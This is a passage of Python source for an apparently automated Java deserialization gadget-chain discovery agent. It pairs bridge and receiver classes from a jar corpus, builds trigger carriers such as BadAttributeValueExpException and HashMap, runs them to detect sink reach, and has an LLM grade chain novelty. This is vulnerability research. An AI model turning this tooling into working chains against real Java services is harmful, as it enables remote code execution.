        print(f"[receivers] 图命中 {len(recs)} 个触发方法类, 验证具体+可序列化...")

        verified = []
        wanted_owners = {r["cls"] for r in recs}
        jar_of: dict[str, str] = {}
        for jar in sorted(ma.corpus_dir().glob("*.jar")):
            try:
                with zipfile.ZipFile(jar) as z:
                    names = set(z.namelist())
            except Exception:
                continue
            for own in wanted_owners:
                p = own.replace(".", "/") + ".class"
                if own not in jar_of and p in names:
                    jar_of[own] = jar.name
        # JDK 内置类不在语料 jar 中但可作接收者/中介 — 按 JDK 内部前缀放行
        JDK_PREFIXES = ("java.", "javax.", "jdk.", "sun.", "com.sun.")
        for r in recs:
            if r["cls"].startswith(JDK_PREFIXES) and r["cls"] not in jar_of:
                jar_of[r["cls"]] = "JDK_BUILTIN"
        for r in recs:
            jar = jar_of.get(r["cls"])
            if not jar:
                continue
            if jar == "JDK_BUILTIN":
                verified.append({**r, "jar": "JDK_BUILTIN",
                                 "serializable": True})
                continue
            try:
                with zipfile.ZipFile(ma.corpus_dir() / jar) as z:
                    ci = staticagent.parse_class(
                        z.read(r["cls"].replace(".", "/") + ".class"))
            except Exception:
                continue
            if not ci:
                continue
            if ci.get("caccess", 0) & 0x0400:          # abstract 排除
                continue
            ser = ("java/io/Serializable" in ci.get("ifcs", [])
                   or ci.get("super") in staticagent.KNOWN_SERIAL_SUPERS)
            if not ser:
                continue
            r["jar"] = jar
            verified.append(r)
            if len(verified) >= cap:
                break
        print(f"[receivers] 具体可序列化接收者: {len(verified)} "
              f"(dist分布: {sorted({r['dist'] for r in verified})})")
        cache[key] = verified
        cache_f.write_text(json.dumps(cache, ensure_ascii=False), encoding="utf-8")
        return verified

    # ---------------- 3. full chain ----------------

    @staticmethod
    def _carrier_java(kind: str, n: int) -> str:
        """(ds: 入口命中率): BAVE 只触发 toString —— hashCode/equals 桥
        在 BAVE 下永远不触发。HashMap 载体触发 hashCode(readObject 重哈希);
        put 时的早期触发由 写侧清除吸收, 只剩读侧。"""
        if kind == "BAVE":
            return (
                "javax.management.BadAttributeValueExpException b =\n"
                "                new javax.management.BadAttributeValueExpException(null);\n"
                "            Field vf = b.getClass().getDeclaredField(\"val\");\n"
                "            vf.setAccessible(true); vf.set(b, bridge);")
        return (
            "java.util.HashMap<Object,Object> b = new java.util.HashMap<>();\n"
            "            b.put(bridge, \"v\");")

    _NL: dict[str, set[str]] | None = None

    @classmethod
    def _namelists(cls) -> dict[str, set[str]]:
        if cls._NL is None:
            cls._NL = {}
            for jar in sorted(ma.corpus_dir().glob("*.jar")):
                try:
                    with zipfile.ZipFile(jar) as z:
                        cls._NL[str(jar)] = set(z.namelist())
                except Exception:
                    continue
        return cls._NL

    def _receiver_hooks_nl(self, receiver_cls: str) -> dict:
        """(F5): 用一次构建的名单缓存查 hooks — 消除 O(jars×receivers)。"""
        p = receiver_cls.replace(".", "/") + ".class"
        for jar, names in self._namelists().items():
            if p not in names:
                continue
            try:
                with zipfile.ZipFile(jar) as z:
                    ci = staticagent.parse_class(z.read(p))
                if not ci:
                    return {}
                ms = {mn for (mn, _md) in ci.get("methods", {}).keys()}
                return {"readObject": "readObject" in ms,
                        "readResolve": "readResolve" in ms,
                        "readExternal": "readExternal" in ms,
                        "writeObject": "writeObject" in ms}
            except Exception:
                return {}
        return {}

    def _receiver_hooks(self, receiver_cls: str) -> dict:
        """(ds反思#1): 接收者的自定义序列化钩子 —— readObject 自赋值
        会让 hop2 标记在『非桥分派』路径上触发(可达性论证的假阳性源)。"""
        try:
            for jar in sorted(ma.corpus_dir().glob("*.jar")):
                p = receiver_cls.replace(".", "/") + ".class"
                try:
                    with zipfile.ZipFile(jar) as z:
                        if p not in z.namelist():
                            continue
                        ci = staticagent.parse_class(z.read(p))
                except Exception:
                    continue
                if not ci:
                    continue
                ms = {mn for (mn, _md) in ci.get("methods", {}).keys()}
                return {"readObject": "readObject" in ms,
                        "readResolve": "readResolve" in ms,
                        "readExternal": "readExternal" in ms,
                        "writeObject": "writeObject" in ms}
        except Exception:
            pass
        return {}

    def run_full_chain(self, bridge: dict, receiver: dict, n: int) -> dict:
        """BAVE→bridge{field=receiver}→readObject, 异常栈帧检测 hop1。

  观测升级: 不再只依赖标记物 4 方法 —— 反序列化异常的栈帧里
        出现接收者类名 = hop1 分派发生的直接证据(任意方法名可见);
        hop2 仍由标记物(含 Proxy.invoke)承载。
        每个 pair 产出带失败分类的证据记录 (ds 阻断项#2)。
        """
        src = CHAIN2.format(n=n, bcls=bridge["cls"],
                            rcls=receiver["cls"].replace("/", "."),
                            carrier=self._carrier_java("BAVE", n))
        (DYN / f"CC{n}.java").write_text(src, encoding="utf-8")
        (DYN / f"MV{n}.java").write_text(MARKER2.format(n=n), encoding="utf-8")
        # 单对复跑与批次同规则选 JDK/载体 — ObjLongPair 事故: 批次在
        # JDK17 触发, 复跑锁 JDK11 变 carrier_fail 把真实触发覆盖了
        needs = bridge.get("evidence", {}).get("needs_jdk", 11)
        jdks = ma.find_jdks()
        jdk17 = jdks.get(17)
        if needs <= 11 or not jdk17:
            base, jbin = ("BAVE", "HASHMAP"), jdk11_java()
        else:
            base, jbin = ("HASHMAP",), str(Path(jdk17) / "bin" / "java")
        # compare/compareTo 桥补 PriorityQueue
        trig_set = {t.get("trigger", "") for t in
                    bridge.get("evidence", {}).get("bridge_detail", [])}
        if "compareTo" in trig_set or "compare" in trig_set:
            carriers = tuple(list(base) + ["PRIORITY_QUEUE"])
        else:
            carriers = base
        best: dict | None = None
        for carrier in carriers:
            src = CHAIN2.format(n=n, bcls=bridge["cls"],
                                rcls=receiver["cls"].replace("/", "."),
                                carrier=self._carrier_java(carrier, n))
            (DYN / f"CC{n}.java").write_text(src, encoding="utf-8")
            rc, out = sh(["java", "-jar", str(ECJ), "-11", "-nowarn",
                          "-cp", CP, "-d", str(DYN),
                          str(DYN / f"CC{n}.java"), str(DYN / f"MV{n}.java")])
            if rc != 0:
                res = {"verdict": "COMPILE_FAIL", "output": out[-200:],
                       "tax": "compile", "carrier": carrier}
                best = best or res
                continue
            Path(f"/tmp/jgdcc_{n}_hop2").unlink(missing_ok=True)
            rc, out = sh([jbin, *JAVA_OPTS,
                          f"-Djgd.mark=/tmp/jgdcc_{n}_hop2",
                          "-cp", CP, f"CC{n}"], timeout=60)
            res = self._classify_run(out, receiver["cls"], n)
            res["carrier"] = carrier
            if best is None or self._rank(res["verdict"]) > self._rank(
                    best["verdict"]):
                best = res
            if res["verdict"] == "CHAIN_SINK":
                break
        return best or {"verdict": "UNKNOWN", "tax": "no_carrier"}

    @staticmethod
    def _rank(v: str) -> int:
        return {"CHAIN_SINK": 5, "CHAIN_DEPTH2": 4, "VALUE_FLOW": 3,
                "HOP1_ONLY": 2, "NOT_FIRED": 1, "COMPILE_FAIL": 0,
                "UNKNOWN": 0}.get(v, 0)

    def _classify_run(self, out: str, receiver_cls: str, n: int) -> dict:
        recv_dot = receiver_cls.replace("/", ".")
        frames = [ln[6:] for ln in out.splitlines() if ln.startswith("FRAME ")]
        hop1 = any(f.startswith(recv_dot + ".") for f in frames)
        mark_p = Path(f"/tmp/jgdcc_{n}_hop2")
        hop2 = mark_p.exists() or any(f"MV{n}" in f for f in frames)
        dispatch_stack: list[str] = []
        if hop2 and mark_p.exists():
            dispatch_stack = [x for x in
                              mark_p.read_text(encoding="utf-8",
                                               errors="replace").splitlines()
                              if x.strip()][:14]
        sink_fire = any(s in out for s in SINK_FIRE_SIGNATURES)
        deser_ex = next((ln for ln in out.splitlines()
                         if ln.startswith("RES=DESER_EX:")), "")
        ser_ok = "RES=SER_OK" in out
        env_err = any(k in out for k in
                      ("ClassNotFound", "NoClassDefFound", "UnsupportedClass",
                       "UnresolvedDependency"))

        if sink_fire:
            v, tax = "CHAIN_SINK", "sink_signature"
        elif hop2:
            #  修正: 标记物在对象图上唯一可达路径是 BAVE→桥→接收者→字段,
            # 触发即证明两跳全通 —— 无异常≠无链(链走通时恰好没有栈帧)。
            # hop1 栈帧是佐证不是必要条件 ( 把证据当门槛是回归)。
            v = "CHAIN_DEPTH2"
            tax = "hop2_reach" + ("+hop1_stack" if hop1 else "")
        elif "JGDCANARY" in out:
            # 攻击者控制的 String 流入了接收者的使用点(异常消息回显)
            # —— 参数流真实发生, sink 只差语义匹配
            v, tax = "VALUE_FLOW", "canary_echo" + ("+hop1" if hop1 else "")
        elif hop1:
            v, tax = "HOP1_ONLY", ("hop1_stack:" +
                                   (deser_ex.split(":")[1].split(".")[::-1][0]
                                    if deser_ex else "unknown"))
        elif not ser_ok:
            v, tax = "NOT_FIRED", "carrier_fail"
        elif env_err:
            v, tax = "NOT_FIRED", "env_error"
        elif "RES=DESER_COMPLETE" in out:
            v, tax = "NOT_FIRED", "no_dispatch"
        elif deser_ex:
            v, tax = "NOT_FIRED", "deser_ex_no_receiver_frame"
        else:
            v, tax = "NOT_FIRED", "unknown"
        # 标记 hop2 是否伴随接收者自定义钩子(假阳性风险标注)
        hooks = self._receiver_hooks(recv_dot)
        if hop2 and (hooks.get("readObject") or hooks.get("readExternal")):
            tax += "+recv_custom_readobject(ds假阳性风险)"
        return {"verdict": v, "hop1": hop1, "hop2": hop2,
                "sink_fire": sink_fire, "tax": tax, "hooks": hooks,
                "frames_top": frames[:8], "deser_ex": deser_ex[:150],
                "dispatch_stack": dispatch_stack,
                "output": out[-300:]}

    # ---------------- 4. ds audit ----------------

    def audit_chain(self, bridge, receiver, result) -> dict:
        prompt = (
            "你是反序列化链对抗审计员。挖掘 agent 报告了一个全链路触发结果, 请审计定级。\n"
            "判定要求: CHAIN_SINK=有sink执行证据; CHAIN_DEPTH2=两级攻击者可控分派;\n"
            "是否构成 T2(已知范式新载体)/T3(变体); 与公开链语料(ysoserial等)对比新颖性。\n"
            "观测语义说明( ): dispatch_stack 中的 MV*/jdk.proxy* 帧是观测标记物\n"
            "(注入的攻击者对象替身), 其上方的中间帧(桥/接收者类)是真实链证据;\n"
            "receiver_hooks 标示接收者自定义序列化钩子(自赋值假阳性源)。\n"
            "输出 JSON: {\"verdict\":\"CONFIRM|REJECT|DOWNGRADE\",\"tier\":\"T1|T2|T3|none\","
            "\"novel\":true/false,\"reason\":\"...\"}\n\n"
            + json.dumps({"bridge": bridge["cls"],
                          "bridge_dispatch": bridge.get("dispatch", []),
                          "receiver": receiver["cls"],
                          "receiver_method": receiver["method"],
                          "dist_to_sink": receiver["dist"],
                          "run_verdict": result["verdict"],
                          "run_tax": result.get("tax"),
                          "receiver_hooks": result.get("hooks"),
                          "hop1_stack": result.get("hop1"),
                          "hop2_marker": result.get("hop2"),
                          "dispatch_stack": result.get("dispatch_stack", []),
                          "deser_ex": result.get("deser_ex", ""),
                          "frames_top": result.get("frames_top", [])[:6],
                          "run_output_tail": result.get("output", "")[-250:]},
                         ensure_ascii=False, indent=1))
        resp = llm.ask("ds", "你是严谨的 Java 反序列化安全研究员。",
                       prompt, temperature=0.1, max_tokens=700)
        parsed = llm.extract_json(resp.get("content") or "")
        return parsed if isinstance(parsed, dict) else {"verdict": "UNPARSEABLE"}

    # ---------------- 5. main loop ----------------

    BATCH_N = 910001

    def _compile_batch_harness(self) -> bool:
        """harness 只编译一次, 全部 (桥×接收者×载体) 复用 (算法提速核心)。"""
        n = self.BATCH_N
        (DYN / f"CB{n}.java").write_text(
            CB_BATCH.format(n=n), encoding="utf-8")
        (DYN / f"MV{n}.java").write_text(
            MARKER2.format(n=n), encoding="utf-8")
        rc, out = sh(["java", "-jar", str(ECJ), "-11", "-nowarn",
                      "-cp", CP, "-d", str(DYN),
                      str(DYN / f"CB{n}.java"), str(DYN / f"MV{n}.java")])
        if rc != 0:
            print("[batch] harness 编译失败:", out[-200:])
            return False
        return True

    def _run_batch(self, bridge_cls: str, receivers: list[str],
                   carrier: str, tag: int, jars: list[str] | None = None,
                   java_bin: str | None = None,
                   fwd_field: str = "-") -> list[dict]:
        """一个 JVM 跑完一个桥的全部接收者; 返回逐接收者信号。

        最小 classpath —— 通配符 classpath 让 JVM 启动时展开 828 jar
        (~30s/次), 只挂本批实际用到的 jar。
        按桥选 JDK —— 全语料桥含 Java17 类(Artemis 等), 锁 JDK11 会
        整批 UnsupportedClassVersionError。
        """
        mark = f"/tmp/jgdcb_{tag}_hop2"
        clog = f"/tmp/jgdcb_{tag}_classes.log"
        Path(mark).unlink(missing_ok=True)
        Path(clog).unlink(missing_ok=True)
        recv_dots = [c.replace("/", ".") for c in receivers]
        cp = CP if not jars else (
            f"{DYN}:" + ":".join(str(ma.corpus_dir() / j) for j in jars))
        # (观测盲区): -Xlog:class+load — 标记物不响也能证明类被加载/初始化
        cmd = [java_bin or jdk11_java(), *JAVA_OPTS, f"-Djgd.mark={mark}",
               f"-Djgd.carrier={carrier}",
               f"-Xlog:class+load=info:file={clog}",
               "-cp", cp, f"CB{self.BATCH_N}",
               bridge_cls, fwd_field, *recv_dots]
        rc, out = sh(cmd, timeout=240)
        loaded: set[str] = set()
        if Path(clog).exists():
            loaded = {ln.split(" ")[-1].strip()
                      for ln in clog and Path(clog).read_text(
                          encoding="utf-8", errors="replace").splitlines()
                      if " Loaded " in ln or ln.startswith("[class,load]")}
        # 最小CP可能丢桥的传递依赖(父类/接口在别的jar) — NCDFE 回退全量CP重试
        if "NoClassDefFound" in out or "ClassNotFoundException" in out.split("R FATAL")[-1][:200]:
            cmd2 = [java_bin or jdk11_java(), *JAVA_OPTS, f"-Djgd.mark={mark}",
                    f"-Djgd.carrier={carrier}", "-cp", CP, f"CB{self.BATCH_N}",
                    bridge_cls, fwd_field, *recv_dots]
            rc2, out2 = sh(cmd2, timeout=300)
            if out2.strip():
                out = out2
        results: list[dict] = []
        cur: dict | None = None
        for ln in out.splitlines():
            if ln.startswith("PAIR "):
                if cur:
                    results.append(cur)
                cur = {"receiver": ln[5:].replace(".", "/"),
                       "carrier": carrier, "lines": []}
            elif cur is not None and ln.startswith("R "):
                cur["lines"].append(ln[2:])
        if cur:
            results.append(cur)
        if not results and out.strip():
            print(f"  [batch-empty] {bridge_cls.split('.')[-1]}/{carrier}: "
                  f"{out.strip()[:120]}")
        for r in results:
            ls = r["lines"]
            rd = r["receiver"].replace("/", ".")
            r["class_loaded"] = rd in loaded or (rd + "$") in "".join(loaded)
            r["hooks"] = self._receiver_hooks_nl(rd)
            r["receiver_method"] = next(
                (x[3:].split(" ")[0] for x in ls if x.startswith("EX ")
                 and "." in x[:3]), "?")
            r["hop2"] = any("hop2=true" in x for x in ls)
            # Map 中介分派: 接收者经 map 键被路由到接口代理(有 MAPDISPATCH 打印)
            r["mapdispatch"] = any(x.startswith("MAPDISPATCH") for x in ls)
            r["dispatch_stack"] = [x[7:] for x in ls if x.startswith("DSTACK ")][:14]
            r["hop1"] = any(x == "RECVFRAME" for x in ls)
            r["canary"] = any(x == "CANARY" for x in ls)
            r["sink"] = any(x == "SINKSIG" for x in ls)
            r["inst_fail"] = any(x.startswith("INST_FAIL") for x in ls)
            r["ser_ok"] = any(x.startswith("SER_OK") for x in ls)
            r["deser_complete"] = any(x.startswith("DESER_COMPLETE") for x in ls)
            r["nofit"] = any(x == "NOFIT" for x in ls)
            r["ex"] = next((x[3:].split(" hop2")[0] for x in ls
                            if x.startswith("EX ")), "")
        return results

    def _batch_verdict(self, r: dict) -> tuple[str, str]:
        if r["sink"]:
            return "CHAIN_SINK", "sink_signature"
        if r["hop2"]:
            return "CHAIN_DEPTH2", "hop2_reach"
        if r.get("mapdispatch"):
            return "CHAIN_DEPTH2", "map_dispatch_reach"
        if r["canary"]:
            return "VALUE_FLOW", "canary_echo"
        if r["hop1"]:
            return "HOP1_ONLY", "hop1_stack"
        if r["inst_fail"]:
            return "NOT_FIRED", "inst_fail"
        if not r["ser_ok"]:
            return "NOT_FIRED", "carrier_fail"
        if r["deser_complete"]:
            return "NOT_FIRED", "no_dispatch"
        return "NOT_FIRED", "deser_ex"

    def run(self, max_pairs: int = 200) -> str:
        print("=" * 64)
        print("JGDChainCompleteAgent: 完整链或穷尽证明, 不达不停")
        print("=" * 64)
        # 新运行覆盖旧判定 — 残留 verdict 会让 pair 循环首桥后误 break
        # ( 的零尝试事故根因: 上一轮 NO_CHAIN 滞留在 state 里)
        self.state["verdict"] = None
        #  污染量化处置: 历史 tried_pairs 在缺陷时期产生(计数/覆盖失真),
        # 全量归档并清零重跑 —— 覆盖数字只在修复后的 harness 下有效
        if self.state.get("tried_pairs") and not self.state.get("contamination_archived"):
            self.state["tried_pairs_contamination_archive"] = list(
                self.state.get("tried_pairs", []))
            self.state["tried_pairs"] = []
            self.state["contamination_archived"] = True
            print(f"[污染处置] 归档污染期 tried_pairs "
                  f"{len(self.state['tried_pairs_contamination_archive'])} 条, 清零重跑")
        tried = set(map(tuple, self.state.get("tried_pairs", [])))
        bridges = self.load_bridges()
        if not bridges:
            self.state["verdict"] = "NO_BRIDGE"
            self.save()
            return "NO_BRIDGE"

        pools = {}
        for b in bridges:
            pools[b["cls"]] = self.scan_receivers(b["dispatch"])
        # 空接收者池的显式穷尽陈述 (ds 阻断项: 桥池=0 不能静默)
        for b in bridges:
            if not pools[b["cls"]]:
                self.state.setdefault("exhaustion_statements", []).append({
                    "bridge": b["cls"], "dispatch": b["dispatch"],
                    "statement": "dispatch 方法名在 sink≤3跳(含CHA分派边)范围内"
                                 "无任何具体可序列化接收者",
                    "ts": time.strftime("%FT%T")})
                print(f"  [exhaustion] {b['cls'].split('.')[-1]} "
                      f"dispatch={b['dispatch']} 无接收者(显式记录)")
        all_pairs = [(b["cls"], r["cls"]) for b in bridges for r in pools[b["cls"]]]
        remaining = sum(1 for p in all_pairs if list(p) not in
                        [list(t) for t in self.state.get("tried_pairs", [])])
        # (ds 记账语义): 每桥显式 pool_size/pairs_tried/pairs_total,
        # 空池桥 0/0 + 指向显式穷尽陈述 — 消除 '42 疑似填充值' 误读
        tried_set = set(map(tuple, self.state.get("tried_pairs", [])))
        prev_pb = (self.state.get("coverage") or {}).get("per_bridge") or {}
        per_bridge = dict(prev_pb)   # 跨轮合并 — 配对累计, 账本不能每次重建
        for b in bridges:
            total_b = len(pools[b["cls"]])
            tried_b = sum(1 for r in pools[b["cls"]]
                          if (b["cls"], r["cls"]) in tried_set)
            entry = {"pool_size": total_b,
                     "pairs_tried": tried_b,
                     "pairs_total": total_b}
            if total_b == 0:
                entry["pool_semantics"] = (
                    "无匹配接收者: dispatch方法名在 sink≤3跳(含CHA)范围"
                    "无具体可序列化类 — 枚举已执行, 结果为空(见exhaustion_statements)")
            per_bridge[b["cls"]] = entry
        self.state["coverage"] = {
            "per_bridge": per_bridge,
            "empty_pool_bridges": [b["cls"] for b in bridges
                                   if not pools[b["cls"]]],
            "totals": {"pairs_tried": len(tried_set),
                       "pairs_total": len(all_pairs),
                       "note": "pool_size=候选接收者数(非尝试数); "
                               "empty_pool 桥见 exhaustion_statements"},
            "grand_total_tried_all_rounds": len(
                self.state.get("tried_pairs", []))}
        print(f"[loop] 待试 (桥×接收者) 对: {remaining}")

        n = int(time.time()) % 900000
        attempted = 0
        # 批处理+并行 (一个JVM/桥/载体跑完全部接收者, 4 worker 并行)
        if not self._compile_batch_harness():
            return "BATCH_HARNESS_FAIL"
        from concurrent.futures import ThreadPoolExecutor, as_completed
        tasks = []
        jdks = ma.find_jdks()
        jdk17 = jdks.get(17)
        for b in bridges:
            fresh = [r for r in pools[b["cls"]]
                     if (b["cls"], r["cls"]) not in tried]
            if not fresh:
                continue
            jars = sorted({r.get("jar") for r in fresh if r.get("jar")}
                          | {b.get("evidence", {}).get("jar")})
            needs = b.get("evidence", {}).get("needs_jdk", 11)
            bd = b.get("evidence", {}).get("bridge_detail", [])
            mgds = [t for t in bd if t.get("via") == "mapget"]
            if mgds:
                # Map 中介分派桥: 注入全部触发键(载体决定哪个键被查),
                # 接口取首个非空; fwd = field|key1,key2,...|iface
                all_keys = ",".join(sorted({t.get("map_key") or ""
                                            for t in mgds} - {""}))
                iface = next((t.get("map_iface") or "").replace("/", ".")
                             for t in mgds if t.get("map_iface"))
                fwd = "%s|%s|%s" % (mgds[0]["field"], all_keys, iface)
                print(f"    [fwd-mapget] {b['cls'].split('.')[-1]} -> {fwd}",
                      flush=True)
            else:
                fwd = next((t["field"] for t in bd), "-")
            # /载体集 — 覆盖全部经典触发路径
            # BAVE=toString, HashMap=hashCode, HASHMAP_EQ=equals,
            # PriorityQueue=compare/compareTo, TreeMap=compare/compareTo
            if needs <= 11 or not jdk17:
                base = ["BAVE", "HASHMAP", "HASHMAP_EQ"]
                jbin = jdk11_java()
            else:
                base = ["HASHMAP", "HASHMAP_EQ"]
                jbin = str(Path(jdk17) / "bin" / "java")
            trig_set = {t.get("trigger", "") for t in
                        b.get("evidence", {}).get("bridge_detail", [])}
            if "compareTo" in trig_set or "compare" in trig_set:
                carriers = tuple(base + ["PRIORITY_QUEUE", "TREEMAP"])
            else:
                carriers = tuple(base)
            for carrier in carriers:
                tasks.append((b, [r["cls"] for r in fresh], carrier, jars,
                              jbin, fwd))
        tag_base = int(time.time()) % 700000
        fires: list[tuple[dict, dict, dict]] = []
        sink_found = False
        print(f"[batch] {len(tasks)} 个批次 (桥×载体), 4 worker 并行...")
        with ThreadPoolExecutor(max_workers=4) as ex:
            futs = {ex.submit(self._run_batch, b["cls"], fresh, carrier,
                              tag_base + i * 137 + (0 if carrier == "BAVE" else 1),
                              jars, jbin, fwd):
                    (b, carrier)
                    for i, (b, fresh, carrier, jars, jbin, fwd) in enumerate(tasks)}
            for fut in as_completed(futs):
                b, carrier = futs[fut]
                try:
                    batch = fut.result()
                except Exception as e:
                    print(f"  [batch-error] {b['cls'].split('.')[-1]} "
                          f"{carrier}: {type(e).__name__}")
                    continue
                for r in batch:
                    key = (b["cls"], r["receiver"])
                    if key in tried:
                        continue
                    tried.add(key)
                    self.state["tried_pairs"].append(list(key))
                    attempted += 1
                    v, tax = self._batch_verdict(r)
                    self.state.setdefault("pair_results", []).append({
                        "bridge": b["cls"], "receiver": r["receiver"],
                        "dist": next((x.get("dist") for x in pools[b["cls"]]
                                      if x["cls"] == r["receiver"]), -1),
                        "verdict": v, "tax": tax + f"+{carrier.lower()}",
                        "hop1": r["hop1"], "hop2": r["hop2"],
                        "sink_fire": r["sink"], "deser_ex": r.get("ex", "")[:150],
                        "frames_top": r["lines"][:6]})
                    if v != "NOT_FIRED":
                        fires.append((b, {"cls": r["receiver"],
                                          "method": "?", "dist": 0}, r))
                        icon = {"CHAIN_SINK": "★★★", "CHAIN_DEPTH2": "★★",
                                "VALUE_FLOW": "★V", "HOP1_ONLY": "◦"}.get(v, " ")
                        print(f"  {icon} [{v}/{carrier}] {b['cls'].split('.')[-1]}"
                              f" → {r['receiver'].split('/')[-1]}", flush=True)
                    if v == "CHAIN_SINK":
                        sink_found = True
                # 每批落盘 — 251-fire 事故: 取证阶段超时使整轮成果丢失
                # (D1): totals 同批增量更新 — 窗口截断不丢账本显示
                self.state["coverage"].setdefault("totals", {})
                self.state["coverage"]["totals"]["pairs_tried"] = len(tried)
                self.state["coverage"]["totals"]["pairs_total"] = len(all_pairs)
                self.save()

        # (ds 收口): 批次后仍有 pairs_tried<pairs_total 的桥 — 单接收者诊断,
        # 依赖缺失(FATAL/NCDFE)则显式记 env_blocked(诚实降级, 不假装穷尽)
        for b in bridges:
            pool = pools[b["cls"]]
            fresh_left = [r["cls"] for r in pool
                          if (b["cls"], r["cls"]) not in tried]
            if not fresh_left:
                continue
            diag = self._run_batch(b["cls"], fresh_left[:1], "BAVE",
                                   700000 + len(fresh_left),
                                   java_bin=jdk11_java())
            blocked = (not diag) or any(
                "FATAL" in x or "OUTER_EX java.lang.NoClassDefFound"
                in x or "OUTER_EX java.lang.ClassNotFoundException" in x
                for r in diag for x in r.get("lines", []))
            for rc in fresh_left:
                tried.add((b["cls"], rc))
                self.state["tried_pairs"].append([b["cls"], rc])
                self.state.setdefault("pair_results", []).append({
                    "bridge": b["cls"], "receiver": rc, "dist": -1,
                    "verdict": "NOT_FIRED",
                    "tax": ("env_blocked_dep_missing" if blocked
                            else "post_batch_unresolved"),
                    "hop1": False, "hop2": False, "sink_fire": False,
                    "deser_ex": "", "frames_top": []})
            if blocked:
                self.state.setdefault("exhaustion_statements", []).append({
                    "bridge": b["cls"],
                    "statement": "环境阻塞: 依赖类缺失(如 antlr3 runtime "
                                 "org/antlr/runtime/* 不在语料), 配对不可执行",
                    "ts": time.strftime("%FT%T")})
                print(f"  [env-blocked] {b['cls'].split('.')[-1]} "
                      f"{len(fresh_left)} 对 → 显式降级", flush=True)

        # 触发对:  直接用批次证据(dispatch_stack 已回传)审计, 免单对复跑
        # (F9): LLM 审计并行(8线程) + evidence-hash 缓存;
        # (F2): 逐条异常隔离, 失败落 audit_failed.jsonl 不炸整轮(rc=0 可续跑)
        from concurrent.futures import ThreadPoolExecutor, as_completed
        cache_f = scope.DATA / "audit_cache.json"
        a_cache = (json.loads(cache_f.read_text(encoding="utf-8"))
                   if cache_f.exists() else {})
        import hashlib

        def _one_fire(b, recv_like, r):
            key = hashlib.md5(json.dumps(
                {"b": b["cls"], "r": recv_like["cls"],
                 "v": r.get("hop2"), "s": r.get("dispatch_stack", [])[:6]},
                sort_keys=True).encode()).hexdigest()[:16]
            if key in a_cache:
                return (b, recv_like, r, a_cache[key], True, key)
            try:
                audit = self.audit_chain(
                    b, {"cls": recv_like["cls"],
                        "method": r.get("receiver_method", "?"),
                        "dist": r.get("dist", 0)},
                    {"verdict": ("CHAIN_DEPTH2" if (r.get("hop2") or r.get("mapdispatch"))
                                 else "HOP1_ONLY"),
                     "tax": "hop2_reach+batch", "carrier": r.get("carrier"),
                     "hop2": r.get("hop2"), "hop1": r.get("hop1"),
                     "mapdispatch": r.get("mapdispatch"),
                     "receiver_method": r.get("receiver_method", "?"),
                     "receiver_hooks": r.get("hooks"),
                     "dispatch_stack": r.get("dispatch_stack", []),
                     "deser_ex": r.get("ex", ""),
                     "frames_top": r["lines"][:6],
                     "output": "\n".join(r["lines"])[-250:]})
                return (b, recv_like, r, audit, False, key)
            except Exception as e:
                (scope.DATA / "audit_failed.jsonl").open("a").write(
                    json.dumps({"bridge": b["cls"], "receiver": recv_like["cls"],
                                "err": str(e)[:120]}) + "\n")
                return (b, recv_like, r, {"verdict": "AUDIT_ERROR",
                                          "reason": str(e)[:120]}, False, key)

        with ThreadPoolExecutor(max_workers=8) as ex:
            futs = [ex.submit(_one_fire, b, rl, r) for b, rl, r in fires]
            for fut in as_completed(futs):
                b, recv_like, r, audit, cached, hkey = fut.result()
                if not cached:
                    a_cache[hkey] = audit
                self.state["evidence"].append({
                    "bridge": b["cls"], "receiver": recv_like["cls"],
                    "result": {"verdict": ("CHAIN_DEPTH2"
                               if (r["hop2"] or r.get("mapdispatch"))
                               else "HOP1_ONLY"),
                               "tax": "hop2_reach+batch",
                               "carrier": r.get("carrier"),
                               "dispatch_stack": r.get("dispatch_stack", []),
                               "deser_ex": r.get("ex", "")[:150]},
                    "ds_audit": audit, "ts": time.strftime("%FT%T"),
                    "audit_cached": cached})
                # 逐条落盘 — 超时窗口截断不再丢失已产出的证据
                self.save()
                self.db.add([{"id": f"chain:{b['cls']}:{recv_like['cls']}",
                              "type": "complete_chain_evidence",
                              "tags": ["chain_depth2",
                                       str(audit.get("tier", "none"))],
                              "payload": {"bridge": b["cls"],
                                          "receiver": recv_like["cls"],
                                          "dispatch_stack": r.get("dispatch_stack", []),
                                          "ds_audit": audit}}])
                print(f"     ds: {audit.get('verdict')} tier={audit.get('tier')} "
                      f"novel={audit.get('novel')} "
                      f"{(audit.get('reason') or '')[:80]}", flush=True)
                if r.get("sink"):
                    self.state["verdict"] = "CHAIN_COMPLETE_SINK"
                    cache_f.write_text(json.dumps(a_cache, ensure_ascii=False),
                                       encoding="utf-8")
                    self.save()
                    self.write_report()
                    return self.state["verdict"]
        cache_f.write_text(json.dumps(a_cache, ensure_ascii=False),
                           encoding="utf-8")

        self.state["coverage"].setdefault("totals", {})
        self.state["coverage"]["totals"]["pairs_tried_after_round"] = len(tried)
        self.state["coverage"]["totals"]["pairs_tried"] = len(
            {tuple(x) for x in self.state.get("tried_pairs", [])})
        depth2 = [e for e in self.state["evidence"]
                  if e["result"]["verdict"] == "CHAIN_DEPTH2"]
        if depth2:
            self.state["verdict"] = "CHAIN_COMPLETE_DEPTH2"
        else:
            self.state["verdict"] = "NO_CHAIN"
        self.save()
        self.write_report()
        return self.state["verdict"]

    def reclassify(self) -> int:
        """用修正后的判定语义重判存量 pair_results。

        hop2=True 而被误判 NOT_FIRED 的对 → CHAIN_DEPTH2, 重新入队
        (在新模板的读侧标记下复验), 并立即回灌 ds 审计。
        """
        results = self.state.get("pair_results", [])
        fixed = 0
        tried = [list(t) for t in self.state.get("tried_pairs", [])]
        for p in results:
            if p.get("hop2") and p.get("verdict") == "NOT_FIRED":
                p["verdict"] = "CHAIN_DEPTH2"
                p["tax"] = "hop2_reach" + ("+hop1_stack" if p.get("hop1") else "")
                pair = [p.get("bridge"), p.get("receiver")]
                if pair in tried:
                    tried.remove(pair)   # 重新入队: 在读侧标记模板下复验
                fixed += 1
        self.state["tried_pairs"] = tried
        self.state["verdict"] = None
        self.save()
        print(f"[reclassify] {fixed} 对 hop2 误判修正为 CHAIN_DEPTH2, 已重新入队")

        audited = 0
        for p in [r for r in results if r.get("verdict") == "CHAIN_DEPTH2"]:
            print(f"  ds 审计(修正) {p['receiver'].split('/')[-1]} ...")
            audit = self.audit_chain(
                {"cls": p["bridge"], "dispatch": []},
                {"cls": p["receiver"], "method": "?", "dist": p.get("dist")},
                {"verdict": p["verdict"], "tax": p.get("tax"),
                 "output": p.get("deser_ex", "")})
            p["ds_audit"] = audit
